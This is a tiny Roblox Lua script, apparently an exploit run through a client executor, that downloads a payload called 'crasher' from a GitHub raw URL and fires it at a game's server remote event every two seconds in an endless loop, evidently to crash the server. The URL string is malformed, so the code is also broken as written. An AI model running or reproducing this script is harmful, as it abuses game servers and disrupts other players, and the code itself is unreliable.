local crasher = game:HttpGet("https://raw.githubusercontent.com/zoiddddd/whitelist/main/Protected"(4).lua")

while task.wait(2.0) do
print("test")    
workspace.__THINGS.__REMOTES.MAIN:FireServer("b", crasher)
end
